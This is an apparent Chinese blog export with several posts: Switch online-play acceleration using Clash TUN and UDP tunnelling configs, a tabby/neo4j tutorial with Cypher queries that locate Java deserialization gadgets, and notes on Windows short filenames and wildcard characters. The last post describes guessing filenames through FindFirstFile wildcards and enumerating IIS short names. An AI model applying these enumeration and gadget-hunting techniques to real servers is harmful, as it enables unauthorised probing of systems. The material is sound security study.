<p>感觉娃套起来之后好像也没见带宽变好。。。可能南京这块链路质量比较好？<br>还有一个奇怪的事情，SSTap并不能改善NAT类型，甚至恶化了，使用SSTap会导致NAT类型铁定为D，即使使用情况与clash完全一致。而clash会将NAT类型从C&#x2F;D提升至B。<br>原因未知，但SSTap+Udp2raw+udpspeeder本身就是设计用来为PC游戏进行加速的，服务器本身就是游戏公司的公网服务器，因此不需要考虑NAT类型（可能是这个原因），而Switch要将就着这些东西用就很拉跨了</p>
<p>客户端服务端套娃服务先起，然后SSTap把酸酸乳服务器指向本地udpspeeder监听的端口就能完成套娃全套服务的实现了，就是完全没感受到套娃和不套的区别。。。</p>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p>一些遇到的乱七八糟的问题</p>
<p>需要先开TUN再开热点，在没有东西连进来的时候选择将TUN网卡的网络共享给热点网卡才能保证不出现逻辑错误产生回环</p>
<p>似乎开热点的时候默认将出口网卡(我这里是WLAN)与其共享使之能正常上网，虽然在网络适配器里面不会直接显示出来，但是的确因为sstap修改了我的共享情况导致之后连接热点无IP分配而连不上，先让WiFi和热点共享一下再把clash和热点共享就又能恢复正常并全局接管了</p>
<p>DNS解析失败问题，似乎是clash的奇怪设置，时好时坏，最后把配置改成了这样，又能行了，电脑开热点的好处是IP和DNS都可以自动获取，少了一个手动分配IP地址什么的，还蛮方便的</p>
<pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">mixin</span><span class="token punctuation">:</span>
  <span class="token key atrule">dns</span><span class="token punctuation">:</span>
    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">enhanced-mode</span><span class="token punctuation">:</span> redir<span class="token punctuation">-</span>host
    <span class="token key atrule">nameserver</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 8.8.8.8
      <span class="token punctuation">-</span> 114.114.114.114
  <span class="token key atrule">tun</span><span class="token punctuation">:</span>
    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">stack</span><span class="token punctuation">:</span> gvisor
    <span class="token key atrule">dns-hijack</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 198.18.0.2<span class="token punctuation">:</span><span class="token number">53</span>
    <span class="token key atrule">macOS-auto-route</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">interface-name</span><span class="token punctuation">:</span> WLAN
</code></pre>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一开始是想做NAT穿透进行类似端口映射之类的，但是由于switch往外通信时的通信端口是不固定的，而常规的端口映射软件都是将内网一个固定的IP映射到公网上，计划不通。<br>还想过利用公网服务器做转发，利用阿里云商业网的链路可能稍微能提升一点网路质量，避开家用网络之类的，但是感觉南京这的网络整体也挺好的，转发也没什么用，倒是用Clash进行Socks转发NAT惊人的提升到了B类，原理未知<br>之后又看了奇怪的教程，想要进行UDP流量的优化，这种事情倒是网上一搜一把，很经典的UDP冗余额外校验和UDP伪装成TCP防止断流，可能在我老家小县城的运营商确实会做这些事情，但是还是只能说南京这边网络好像挺好的。。。<br>折腾到最后UDP加速套娃并不能带来太好的体验，甚至将NAT类型降级为D，主要原因还是PC游戏是有游戏公司的服务器，不是Switch这种玩家做服务器的实质上是P2P的模式，所以常用套路套在switch上并不适用。并且由于各种软件在本地环路上的处理，经常出现环路流量闭合自爆的情况，最后费时费力发现能用的也就是一开始的socks5转发能提升一个NAT类型，UDP优化在南京没什么用，回家之后不知道有没有意义。</p>
<p>说到底，费时费力搞了差不多一个星期，最后也没什么意义嘛。解决了一堆乱七八糟的没什么意义的问题倒是真的<br>也许回去之后也会直接买个UU一把梭，享受专线直通尊贵服务呢？</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.moerats.com/archives/662/">UDPSpeeder+Udp2raw使用教程，并配合SSTap加速优化网络游戏</a><br><a href="https://teddysun.com/489.html">一键安装最新内核并开启 BBR 脚本</a><br><a href="https://github.com/wangyu-/UDPspeeder/wiki/%E6%8E%A8%E8%8D%90%E8%AE%BE%E7%BD%AE">UDPspeeder推荐设置</a><br><a href="https://eller.tech/post/36">ShadowsocksR+UDPSpeeder+Udp2raw+KCP实现网游加速</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>Switch</tag>
        <tag>Clash TUN</tag>
      </tags>
  </entry>
  <entry>
    <title>Switch联机加速研究</title>
    <url>/switch%E8%81%94%E6%9C%BA%E6%B7%B1%E7%A9%B6.html</url>
    <content><![CDATA[<h1 id="Switch联机加速研究"><a href="#Switch联机加速研究" class="headerlink" title="Switch联机加速研究"></a>Switch联机加速研究</h1><p>接上一篇，研究了switch设置中的代理设置和如何自己实现一个简陋的Switch全局代理</p>
<h2 id="Switch代理情况及解决方案"><a href="#Switch代理情况及解决方案" class="headerlink" title="Switch代理情况及解决方案"></a>Switch代理情况及解决方案</h2><p>之前和大姐联机的时候wireshark抓到的包和其在switch上连接测试显示的ip是一致的</p>
<p>尝试直接使用clash代理端口转发的时候，发现在STUN第一步的时候就变成了switch直接连接STUN服务器，而不是把流量转发给代理，TCP的流量都全部转发给代理了，所以在连接测试这一步的时候switch所显示的IP就是代理ip，地理位置台湾。<br>而实际玩耍的时候根据流量包来看UDP流量都是直接和对端通信的，从和STUN服务器的通信状态中可以看见，我注册了一个153开头的ip上去，查一下，江苏南京联通，铁校园网，计划完全失败。</p>
<p>抓包研究表明，Switch设置代理的时候只转发TCP流量，而UDP流量不走代理，正如设置代理选项那一栏上写的，<strong>某些软件并不支持代理</strong>，而实际的结果却是只有eshop走代理。。。</p>
<h3 id="通过网关接管全流量"><a href="#通过网关接管全流量" class="headerlink" title="通过网关接管全流量"></a>通过网关接管全流量</h3><p>如果说Switch的代理设置不转发UDP的话，那之前挂加速器的大姐和我联机我就不可能看到我这边的通信清一色是和她的代理IP一致的，因此单纯的设置代理服务器肯定不能实现UDP代理，需要新的实现方案<br>下了个灵缇试了一下，看看他是怎么做的<br>灵缇的实现方案为手动设置switch网关，DNS，和代理服务器三个选项</p>
<p>把手机设为switch网关，让所有流量到达手机之后让手机进行处理，即可强行接管UDP流量。一个简单的旁路由思路（我是网络垃圾呜呜呜）<br>因为发送流量都是看路由表的嘛，然后我把默认路由填到手机地址，那数据包第一跳就稳定到手机上，手机监听网卡，接管全流量，再选择Switch的流量进行转发，的确是个很棒的想法<br>之前也看到clash上说过使用TAP或TUN模式接管全流量，使得不走代理的软件也可以走代理</p>
<h2 id="游戏联机通信情况"><a href="#游戏联机通信情况" class="headerlink" title="游戏联机通信情况"></a>游戏联机通信情况</h2><p>确实如榜一大哥曾经和我说的，Switch使用STUN服务器使玩家互相发现，若玩家之间NAT类型较好，通信质量佳，即可让其直接通信，如果双方通信质量不佳，比如存在D类NAT，则使用STUN服务器辅助传输数据。<br>没开加速器用D类玩玩了一把，整场通信下来发现我既在和房主UDP通信，时不时也会穿插一些和任天堂STUN服务器通信的TRUN包，wireshark中显示这个包的协议仍是STUN，不过后面的附加内容写的是TURN，是用来数据传输</p>
<p>TURN协议，用来解决P2P问题的，具体看百科吧。</p>
<h2 id="clash-TUN全局接管"><a href="#clash-TUN全局接管" class="headerlink" title="clash TUN全局接管"></a>clash TUN全局接管</h2><h3 id="2021-4-19-update"><a href="#2021-4-19-update" class="headerlink" title="2021.4.19 update"></a>2021.4.19 update</h3><p>该方案似乎在实践上有些问题，后来发现了一个电脑开热点的网络共享解决方案，以及优雅arp劫持方案，<strong>弃置这个方案</strong>，用新的<br><a href="https://blog.z3ratu1.cn/Switch%E8%87%AA%E5%BB%BANAT%E4%BC%98%E5%8C%96%E6%8C%87%E5%8C%97.html">Switch自建NAT优化指北</a><br>现在这个方案只是留着记录一下当初研究的思路</p>
<h3 id="2021-8-6-update"><a href="#2021-8-6-update" class="headerlink" title="2021.8.6 update"></a>2021.8.6 update</h3><p>最近又学了一点网络知识，突然想起来是不是因为windows机器没开路由转发所以连不上网？可以试一下把机器的路由转发开了再试试，不过现在switch不在手边并不能做测试了，文末参考链接中有启动windows10路由转发的教程</p>
<p>后经测试，好像还是不行。。。<strong>后文内容将更改为对该方案失败原因的研究</strong></p>
<h3 id="2022-2-12-update"><a href="#2022-2-12-update" class="headerlink" title="2022.2.12 update"></a>2022.2.12 update</h3><p>看到了全新的解决方案，我开始对我当初的记忆产生怀疑，为什么当初我那个很奇怪的方案成功实现了？究竟是哪里发生了玄学的问题？遵循其他大佬的足迹走到了这步，发现了一个实现方案及其优雅，且并不繁琐，<strong>甚至不需要全局接管</strong>，我一直在寻找的其实就是这样子的一个软件。也许这个才是最为正确的思路。整合更新也同步到了上面提到的《Switch自建NAT优化指北》中，<strong>本文后续内容理论上作废</strong>，这个思路的出发点并没有太大的问题，但由于对网络的浅薄认识，并不能指出问题所在的点<br><strong>后续仅可作为clash tun配置教程</strong></p>
<p>但若PC不开启路由转发功能，就算有机器将其作为网关，又能实现转发吗？我觉得似乎不行，这也就是switch显示DNS查询失败的原因<br>启动wireshark，可以发现switch实践上判断是否联网就是在连接WiFi的时候对几个任天堂域名进行DNS查询，而从wireshark的结果可以看出，在未开启路由转发的情况下，虽然确实拿到了请求包，但PC对此无动于衷，该数据包被简单的抛弃，当然就无法完成DNS查询，导致失败</p>
<p>但是如果启动PC的路由功能呢?就会出现clash上行流量几百兆，CPU内存暴增，以及疯狂创建本地socket连接等情况。。。简单抓包发现clash自己那块网卡里面炸了。每秒上百兆的流量就是从那里面来的，目前猜测是可能路由转发导致了奇怪的类似环路的流量，然后原地反复跑导致的</p>
<h3 id="2022-4-21-update"><a href="#2022-4-21-update" class="headerlink" title="2022.4.21 update"></a>2022.4.21 update</h3><p>仔细翻了一下cfw的issue，似乎有很多人尝试使用clash在windows机器上充当网关进行流量转发，但我之前提过一个issue时作者便告知无法在windows上实现。。。现在翻了一下类似的issue贼多，所以我当初是怎么跑起来的。。。（记忆出现了紊乱？）<br>因此，<strong>windows机器下网关接管方案彻底废弃</strong>（但从有一个地方看到有人说win机器可以用surge做旁路由。有兴趣的可以去试试那个）<br><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/1622">tun模式下如何实现网关模式 #1622</a><br><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/1649">TUN使用问题 #1649</a><br><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2077">clash windows tun模式 作为网关 没有转发其他设备的请求 #1865</a></p>
<blockquote>
<p>win和mac都可以转发，但是因为windows的interface-name绑定是设置local address实现的，转发打开之后这个这个连接就被转发回来，然后回环。</p>
</blockquote>
<p>也许尊贵的Mac能用呢</p>
<p>至此，原网关流量接管计划完全失败</p>
<h2 id="原文章部分"><a href="#原文章部分" class="headerlink" title="原文章部分"></a>原文章部分</h2><p>————————————–分割线———————————–</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>和灵缇实现类似，通过在物理机上新加一个网卡，接管全局流量（物理机的也全接管了，QQ什么的都接管了。。。）<br>然后在switch上设置网关DNS为物理机，这样子Switch的全部流量第一跳也会到达物理机上的Clash网卡，被接管，不走UDP的流量也就在我们的掌控之中啦<br>然后Clash网卡上的流量会按照Proxy里面的规则转发</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>直接搜Clash TUN有官方教程，下载dll安装服务，小地球变绿<br>配置mixin，让开关mixin来启动TUN，这里只有一个坑点，官方教程里的mixin样例少了一行。。。<br>导致缩进和内容都不对就不能正常启动</p>
<pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">mixin</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># object</span>
  <span class="token key atrule">dns</span><span class="token punctuation">:</span>
    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">enhanced-mode</span><span class="token punctuation">:</span> redir<span class="token punctuation">-</span>host
    <span class="token key atrule">nameserver</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 1.1.1.1 <span class="token comment" spellcheck="true"># 真实请求DNS，可多设置几个</span>
      <span class="token punctuation">-</span> 119.29.29.29
      <span class="token punctuation">-</span> 223.5.5.5
  <span class="token key atrule">tun</span><span class="token punctuation">:</span>
    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">stack</span><span class="token punctuation">:</span> gvisor
    <span class="token key atrule">dns-hijack</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 198.18.0.2<span class="token punctuation">:</span><span class="token number">53</span>
    <span class="token key atrule">macOS-auto-route</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
    <span class="token key atrule">macOS-auto-detect-interface</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># 自动检测出口网卡</span>
</code></pre>
<p>直接复制粘贴就行，具体选项可以去看文档</p>
<p>这里稍微多提一下enhanced-mode的redir-host和fake-ip的区别<br>redir-host是在进行dns查询时通过代理同时向多个dns服务器查询，并返回得到的结果作为结果。而fake-ip则是在查询时立即返回一个保留网段的ip，并在clash中存一个fake-ip和域名的映射，再由clash进行查询并返回<br>使用fake-ip时可能会遭遇到下级软件本身缓存了dns查询结果，导致clash挂了或者某些特殊情况时就上不了网了，可以简单的看openClash的wiki<br><a href="https://github.com/vernesong/OpenClash/wiki/%E5%B8%B8%E8%A7%84%E8%AE%BE%E7%BD%AE">常规设置</a></p>
<p>然后开关mixin开关就能看见自己多了一个Clash网卡<br>用route print命令查看本机路由表<br>TUN开启之前</p>
<pre><code>IPv4 路由表
===========================================================================
活动路由:
网络目标        网络掩码          网关       接口   跃点数
          0.0.0.0          0.0.0.0     10.203.128.1   10.203.236.138     45
     10.203.128.0    255.255.128.0            在链路上    10.203.236.138    301
   10.203.236.138  255.255.255.255            在链路上    10.203.236.138    301
   10.203.255.255  255.255.255.255            在链路上    10.203.236.138    301
    ......
</code></pre>
<p>网关为校园网网关，接口为本机WiFi网卡的IP地址<br>TUN开启后</p>
<pre><code>IPv4 路由表
===========================================================================
活动路由:
网络目标        网络掩码          网关       接口   跃点数
          0.0.0.0          0.0.0.0     10.203.128.1   10.203.236.138     40
          0.0.0.0          0.0.0.0            在链路上        198.18.0.1      0
     10.203.128.0    255.255.128.0            在链路上    10.203.236.138    296
   10.203.236.138  255.255.255.255            在链路上    10.203.236.138    296
   10.203.255.255  255.255.255.255            在链路上    10.203.236.138    296
    .....
</code></pre>
<p>显然可以看见，新增了一条指向198.18.0.1的路由，而这个IP正是clash创建的Clash网卡的IP，也就是说本机的所有流量都会按照这个路由表转发到对应的网卡上，再进行下一步处理<br>这时clash就已经接管了全部流量了，然后所有流量都会按照proxy的规则转发</p>
<h3 id="愚蠢的思考"><a href="#愚蠢的思考" class="headerlink" title="愚蠢的思考"></a>愚蠢的思考</h3><p>之前一直在想为什么网关能直接设置，两个主机间通信应该是需要端口的，而这里我并不设置端口监听，也没让switch选择通信端口，虽然我感觉这个通信的确是属于网络层而不在传输层，但我一瞬间没能想通通信是怎么完成的。。。<br>然后还问了下学长。。。。他突然和我说监听网卡，我才想起来网卡才是机器接受信息的最原始接口，端口只不过是区别不同进程间的通信罢了。</p>
<h3 id="小小的困难"><a href="#小小的困难" class="headerlink" title="小小的困难"></a>小小的困难</h3><p>因为我之前的设置是不开系统代理的，Clash就作为一个简单的HTTP代理用，所以Proxy直接选的GLOBAL，浏览器上设置规则，而现在开了TUN之后还走全局代理未免显得有些愚蠢，那就得去看看Rule是怎么写的<br>当然是抄的机场写好的规则，但是规则分到最后涵盖的不全面，除去几个知名网站剩下的都是其他流量。<br>如果想给switch加速的话，其他流量都走代理是最好的，不然你也不知道你的联机对端是谁，也不知道任地狱服务器是啥，好像能设置检测switch的Mac地址然后对来源匹配的进行转发，不过太麻烦了懒得研究了。。。但是这样子其实绝大多数软件的流量肯定是不在知名网站的匹配范围内的，这样子就也会有很多不必要的流量被转发，就很烦，比如QQ就会顺理成章的变成在香港登录。。<br>如果其他流量不走代理，switch加速计划直接破产。。。</p>
<p>最终暂时决定，维持不变，就直接全局代理，在玩游戏的时候再开ClashTUN就是，不玩游戏就关掉<br>有时间再研究一下怎么配置规则</p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>考试考完回家躺尸一个星期后更新，期间被出云大佬联系，学习了一些新名词。不过本废物暂时还不想动手去学，稍微调了一下clash的DNS设置就拉倒了，目前似乎能在体感上稍微感觉到好了一点点（大概），并不知道实际上好在哪</p>
<p>大佬和我说游戏流量遇到的一大问题在于UDP流量容易被运营商丢弃，俗称“断流”，所以还要在外面再套一层TCP。总觉得好麻烦哦。。<br>clash关于TUN模式的DNS设置的话官方文档好像有点问题，官方mixin里面dns配置的是redir-host但是TUN里面选了一个dns-hijack，这个只在fake-ip模式中有用，如果本身的配置文件就有fake-ip的配置的话，可以只添加TUN来完成流量接管</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://github.com/Dreamacro/clash/issues/971">请教TUN模式下UDP转发</a><br><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/1500">TUN模式开启后无法接管系统流量</a><br><a href="https://blog.csdn.net/weixin_44647835/article/details/109616688">Windows 10上开启路由转发及添加路由</a><br><a href="https://zankyo.cc/2845">Nintendo Switch：~联机加速方案的研究与折腾~</a><br><a href="https://zankyo.cc/3389/">Nintendo Switch：~使用Pcap2Socks给主机联机加速~</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>Switch</tag>
        <tag>Clash TUN</tag>
      </tags>
  </entry>
  <entry>
    <title>tabby使用入门</title>
    <url>/tabby%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="tabby使用入门"><a href="#tabby使用入门" class="headerlink" title="tabby使用入门"></a>tabby使用入门</h1><p>在坐完了CodeQL的牢之后，尝试使用另一个高级一点的工具</p>
<p>整体的使用难度并不是很高，主要是顺便把windows上的一些乱七八糟的java环境相关的事情重新理了一遍。把一些垃圾文件清理掉了</p>
<p>（用了半天感觉windows跑java不行）</p>
<p>说起来搜这个tabby的时候搜到了另一个叫tabby的终端，看了一下挺好看的就替换掉了非常不行的cmder和git bash（唯一缺点是启动需要个两三秒）。然后就出现了用tabby在命令行跑tabby的操作</p>
<h2 id="java相关环境配置"><a href="#java相关环境配置" class="headerlink" title="java相关环境配置"></a>java相关环境配置</h2><p>挺简单的，去下个neo4j Desktop，然后记得把发的垃圾邮件退订。一路安装就行了，desktop非常的图形化，比较友好</p>
<p>然后apoc的插件似乎也不需要手动安装，在plugins那一栏可以直接自动安装。就是不知道为什么简单的装了个插件建了个数据库就用掉了我5G的硬盘呢？</p>
<p>然后neo4j的话因为我下的新版，所以需要Oracle java11。又临时去Oracle下了个。之后对整个电脑的java环境进行了一个检查</p>
<p>无非也就是些注册表和环境变量的检查。现在java早就已经不使用什么远古java home这种手动配置方案了，会在安装时直接在系统的PATH里给你塞一个环境变量，还要置顶。。。<br>一般来说是这个路径<code>C:\Program Files\Common Files\Oracle\Java\javapath</code>，然而这个路径实际上是一个软链接，软链接到这个目录下的一个java_target_xxx。。。。这个目录里面塞了一个java一个javac和一个javaw？那为什么不直接连接到java安装目录的bin下？<br>简单改造，把这个目录删了直接环境变量设到java安装目录。。希望不会出大问题</p>
<p>然后还有一个遗留问题。我的burp是远古时期的某个印度破解版。只兼容jdk8，如果我把整体调整到11他是跑不起来的。并且还不支持openjdk，只能用Oracle的。</p>
<p>但是我神奇的发现修改环境变量并不会导致双击打开jar包的jdk更改，然后感觉应该是注册表，搜了一下，果然是注册表中的javaw.exe决定了这个操作。这样子就能在环境变量是java11的情况下继续用我的远古burp了。。。（还是找个时间升级一下好了）</p>
<h2 id="编译tabby"><a href="#编译tabby" class="headerlink" title="编译tabby"></a>编译tabby</h2><p>tabby只支持jdk8，所以不要用jdk11<br>编译配置都写好了，用的是gradle，应该是类似于maven的东西。但是我默认的jdk8u311在运行的时候会报一个非常奇怪的错误</p>
<pre><code>Java home is different.
Expecting: &#39;D:\Java\jdk\jdk1.8.0_311&#39; but was: &#39;D:\Java\jdk\jdk1.8.0_311\jre&#39;.

Please configure the JDK to match the expected one.
</code></pre>
<p>谷歌的话处理方案多种多样，但简单的看了几眼都和我的情况不一样<br>最后在某个不起眼的角落发现了一个低赞回答</p>
<pre><code>IntelliJ broke when I copied tools.jar to a jre/lib, attempting to make hot attach work.
</code></pre>
<p>说起来我之前因为某个不知名的原因好像真的做过这个操作。。。然后把jre下面的tools.jar删掉就可以了。。。</p>
<p>以及IDEA默认的maven和gradle的目录都在用户的家目录下。并且不知道为什么gradle那个目录上来就直接3G，看了下有一个cache目录就2G。。。不知道都在干些什么，硬盘真有点吃紧了<br>尤其是我的C盘已经有点不堪重负了。全部转移到D盘，并且对项目的配置进行修改。这里也很坑，修改只对当前项目有效，也就是之前的项目全部得单独配置。。。最坑的还不是这里，新开项目仍然是按照家目录的默认配置，需要从<code>File-&gt;New Project Setup-&gt;Seting For New Projects</code>处再额外修改才能确保未来不被坑</p>
<p>这里有一个新的坑。GitHub上的release的代码事实上是有点旧的，一些在已经关闭的issue中修复的问题实际上是在最新的release之后，我就说我怎么自己编译的还跑不通。。。</p>
<p>然后直接从主页拉最新的代码进行编译<br>然后刚好撞上tabby更新将命令行参数更改到配置文件参数，但是实际上的help页面还是对应的命令行版本，且有一个isJDKOnly选项不能正常用的小bug。。。以及isSaveOnly选项给去掉了，跑完直接往数据库里写。搞得我一开始莫名其妙了半天然后自己看了下代码发现有问题再魔改了一下源码。不过这样子就可以直接在IDEA里面改配置文件直接运行spring app，不像原来一样需要打一个jar包命令行运行。</p>
<p>打jar包命令行运行的话需要把jar包和rules和config目录放在同一级，否则也会出现找不到文件之类的错误</p>
<p>然后不要高估自己的小笔记本的性能。。。。<br>今天试了一下单跑一个isJDKOnly，数据库倒是在几分钟内写完了，但是将数据库导入log4j花了一个小时都没完成。。。并且CPU占用一直100%，感觉要烧了。。。</p>
<p>被迫中断。然后从jdk里面选了个最大的rt.jar进行分析。倒是在十几分钟内把分析+导入数据库给完成了。然后就可以开始尝试写语句了</p>
<h2 id="neo4j简单入门"><a href="#neo4j简单入门" class="headerlink" title="neo4j简单入门"></a>neo4j简单入门</h2><p>上来会直接有一个提示命令可以查看数据库的基本逻辑关系。这对接下来的查询有很大的帮助<br><code>CALL db.schema.visualization()</code></p>
<p>得到这样子的一幅图</p>
<p><img src="/images/tabby%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20220331214639131.png" alt="image-20220331214639131"></p>
<p>圈表示节点，线表示路径且有方向</p>
<p>目标是复现上次HFCTF的二次反序列化类，找到一个调用了readObject方法的get开头的方法</p>
<p>上次写过codeql之后感觉用起来上手就更快了<br>使用<code>match</code>语句定义变量，<code>where</code>语句添加约束，<code>return</code>语句返回结果。函数什么的暂时不学</p>
<p>使用括号来表示节点，<code>-[]-&gt;</code>表示路径关系<br>然后可以从图中看出类与类直接的关系是继承，方法与方法直接的关系是调用，别名问了下甫舟，就是只继承重写之类的操作。然后类中包含方法（实际上后面测试发现也有类包含类，应该是指在类中定义的类，而不是成员变量。tabby似乎并不能对类与成员变量之间的关系进行分析）</p>
<p>那么先写一个雏形出来</p>
<pre><code>match (source:Method)-[:CALL|ALIAS]-&gt;(sink:Method)
where source.NAME =~ &quot;get.+&quot; and sink.NAME=&quot;readObject&quot;
return * limit 10
</code></pre>
<p>其实这个语句就直接查出来结果了。。。。<br><code>=~</code>表示使用正则匹配，Method是有一个IS_GETTER属性的，然而get开头的方法并不等价于他就是getter，所以用正则直接匹配get开头的方法。说起来当初调试Hessain的时候就发现他的反序列化理论上是只调用getter但实际上没有很调通发生了什么但就是调用了这个不是getter的getObject。。。</p>
<p>然后为了保险和练习起见加一些buff</p>
<pre><code>match (source:Method)-[:CALL|ALIAS*..3]-&gt;(sink:Method)
match (c:Class&#123;IS_SERIALIZABLE:TRUE, IS_INTERFACE:FALSE&#125;)-[:HAS]-&gt;(source)
where source.NAME =~ &quot;get.+&quot; and sink.NAME=&quot;readObject&quot; and source.PARAMETER_SIZE=0
return * limit 10
</code></pre>
<p>结果也不会有什么区别，不过条件拉的更满就更加的稳妥嘛<br>这里唯一需要记忆的语法就是<code>*..n</code>，猜也能猜出来是重复步长的意思</p>
<p>用起来上手还挺快的，没有codeql那么折磨，也可能是因为整体关系较为简单的缘故，所以精细程度什么的也就不如codeql精细了。所以这里就算找到了这个函数，也没发编写语句查看一下这个传入readObject的参数是否易失之类的。</p>
<p>还有上次susctf的那个寻找一个可序列化且存在一个成员变量为Object类型的类也没法实现</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>windows下的奇妙文件名</title>
    <url>/windows%E4%B8%8B%E7%9A%84%E5%A5%87%E5%A6%99%E6%96%87%E4%BB%B6%E5%90%8D.html</url>
    <content><![CDATA[<h1 id="windows下的奇妙文件名"><a href="#windows下的奇妙文件名" class="headerlink" title="windows下的奇妙文件名"></a>windows下的奇妙文件名</h1><p>起因是看了看红明谷杯线下的一篇wp，然后又进行了递归式学习。从discuz RCE学到windows文件名格式</p>
<h2 id="8dot3文件名格式"><a href="#8dot3文件名格式" class="headerlink" title="8dot3文件名格式"></a>8dot3文件名格式</h2><p>也称为短文件名格式，在远古的DOS系统上，规定主文件名不能超过8个字符，后缀不能超过3个字符，这个格式就成为8dot3格式。windows向前兼容远古的MS-DOS，因此对于所有违背上述规定的文件名都会创建一个8dot3格式的短文件名，主文件名超过八位就截取前6位，然后接一个<code>~1</code>，如果存在前缀相同就数字递增，后缀超过三位就截取前三位，在cmd中直接敲<code>dir /x</code>就可以看到对应的短文件名</p>
<pre><code>C:\Users\xxx\Desktop\test&gt;dir /x
 驱动器 C 中的卷是 Windows-SSD
 卷的序列号是 06C1-0E48

 C:\Users\xxx\Desktop\test 的目录

2021/04/24  15:23    &lt;DIR&gt;                       .
2021/04/24  15:23    &lt;DIR&gt;                       ..
2021/04/24  15:23                 0 123~1.TXT    123.txtttt
2021/04/24  15:23                 0 123456~2.TXT 123456780.txt
2021/04/24  15:22                 0 123456~1.TXT 123456789.txt
               3 个文件              0 字节
               2 个目录 12,907,061,248 可用字节
</code></pre>
<p>可以使用<code>fsutil 8dot3name set 1</code>关闭该8dot3文件格式的支持</p>
<h2 id="winAPI的玄妙通配符"><a href="#winAPI的玄妙通配符" class="headerlink" title="winAPI的玄妙通配符"></a>winAPI的玄妙通配符</h2><p>windows系统在处理文件名的时候，<code>FindFirstFileExW()/FindFirstFile()</code>这两个API会对<code>&lt; &gt; &quot;</code>这三个字符做特殊处理，效果分别对应Linux下的通配符<code>* ? .</code>，只要当最终实现是用这个API的就会受到影响，比如参考文章中提到的<code>getimagesize()</code>函数<br>感觉大部分的文件操作都会用这个API实现，本地测了一下file_get_contents也能通配符获取数据，直接<code>file_get_contents(&quot;inde&lt;.html&quot;)</code>就行。和PHP版本没什么关系，也和web服务器类型没什么关系，只要windowsAPI没改就能通杀</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>后来又进行了测试，似乎通配符只能通配一个路径，比如一个目录名或一个文件名，当同时去匹配两个及以上的目录或文件名时将无法匹配，例如存在一个目录<code>C:/htdocs/index.php</code>，那么<code>C:/ht&lt;&lt;/index&lt;&lt;</code>是无法匹配到htdocs目录下的index.php的。且<code>&lt;</code>和<code>*</code>的功能并不完全相同，单个小于号似乎匹配到<code>.</code>就会停止匹配，比如<code>C:/htdocs/index.&lt;</code>能匹配上index.php，但<code>C:/htdocs/index&lt;</code>就不行，而<code>&lt;&lt;</code>就能进行任意匹配了，即使目标文件名存在多个点号<br>但是<code>C:/&lt;&lt;/index.php</code>也无法成功匹配，匹配时似乎至少得有一个字符存在，比如<code>C:/h&lt;&lt;/index.php</code>，但若直接存在<code>C:/index.php</code>的话则不需要任何字符也能用上述语句进行匹配</p>
<p>同理，在有类似功能且参数可控的情况下，可以利用通配符进行快速的文件名猜解。</p>
<h2 id="短文件名，通配符与windows的web服务"><a href="#短文件名，通配符与windows的web服务" class="headerlink" title="短文件名，通配符与windows的web服务"></a>短文件名，通配符与windows的web服务</h2><p>关系比较乱。。。并且我本地只有Apache和IIS环境，就只这两个进行验证了，网上找了个野生的Nginx但是由于是别人的站也就不好下手。。。。主要是参考文末的文章</p>
<p><strong>当函数调用最后通过windowsAPI时均支持通配符，与使用的语言和webserver类型无关</strong></p>
<h3 id="windows-IIS"><a href="#windows-IIS" class="headerlink" title="windows+IIS"></a>windows+IIS</h3><p><strong>支持短文件名猜解，通配符访问文件（不可访问文件夹）</strong><br><strong>不支持短文件名访问</strong><br>话说能猜解短文件名但是猜解出来又不能访问有什么用。。。。脑洞补全吗<br>也可以猜解出来再通配符访问吧，但是本地复现时是不能通配符访问的</p>
<h4 id="IIS全版本短文件名猜解"><a href="#IIS全版本短文件名猜解" class="headerlink" title="IIS全版本短文件名猜解"></a>IIS全版本短文件名猜解</h4><p>远古洞，是IIS6配合.net的时候导致的短文件名猜解。猜解需求当然是目标存在短文件名，可以猜解出短文件名来。在这种情况下可以通过<code>*</code>通配单个字符，在猜测正确的情况下返回404，错误返回400<br>在后续的IIS版本上修了这个问题，但是当请求方法从GET变成OPTION或者TRACE之后，仍然会出现布尔结果，约等于全版本通杀<br>在远古的远古版本似乎还能进行短文件名访问，后来给修了</p>
